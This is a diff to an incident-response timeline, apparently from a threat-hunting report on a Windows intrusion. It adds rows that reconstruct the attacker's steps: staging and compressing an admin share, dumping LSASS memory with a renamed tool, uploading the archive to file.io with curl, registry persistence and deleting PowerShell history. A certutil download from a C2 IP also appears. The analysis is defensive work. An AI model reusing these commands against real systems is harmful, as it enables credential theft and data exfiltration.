@@ -298,9 +298,11 @@ A forward-looking strategy will involve more granular network access controls an
 | `2025-11-22T00:56:47.4100711Z` | A PowerShell script was downloaded using a Windows binary. `*"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` was executed to download the malicious script from the C2 server. |
 | `2025-11-22T01:07:53.6746323Z` | The file `IT-Admin-Passwords.csv` was created within the staging directory and indicated intent to harvest credentials by using a self-explanatory naming convention. |
 | `2025-11-22T01:07:53.6430063Z` | Using a built-in system utility, the attacker replicated a network share's contents while preserving attributes and subdirectories using the command: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
+| `2025-11-22T01:30:10.0981853` | The command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .` indicates utilization of a cross-platform compression tool to prepare the data in a portable format before exfiltration. |
+| `2025-11-22T02:03:19.9845969Z` | The credential dumping tool was renamed to `pd.exe`. This is a basic OpSec practice in order to evade signature-based detection. |
+| `2025-11-22T02:24:44.3906047Z` | The process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` indicated the target of a critical security process (LSASS). This is critical evidence that shows exactly how credentials were extracted. |
+| `2025-11-22T01:59:54.2755596Z` | In order to exfiltrate the data, a native Windows utility was used to upload the compressed archive to an external enpoint with the command: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` |
+| `2025-11-22T01:59:54.2755596Z` | The cloud service `file.io` can be identified as the cloud file sharing service to exfiltrate the credentials. |
+| `2025-11-22T02:10:50.7952326Z` | `FileShareSync`, a registry value name, was added and modified in order to appear as a legitimate boot or logon autostart execution software. This was done in order to establish persistence. |
+| `2025-11-22T02:10:50.7952326Z` | The PowerShell script `svchost.ps1` was masqueraded as a legitimate Windows component to avoid suspicion. This script was identified as the persistence beacon. |
+| `2025-11-22T02:26:01.1661095Z` | Anti-forensic techniques were implemented in order to avoid evidence collection. The PowerShell history file `ConsoleHost_history.txt` was deleted by the attacker. This file logs interactive PowerShell commands across sessions. |
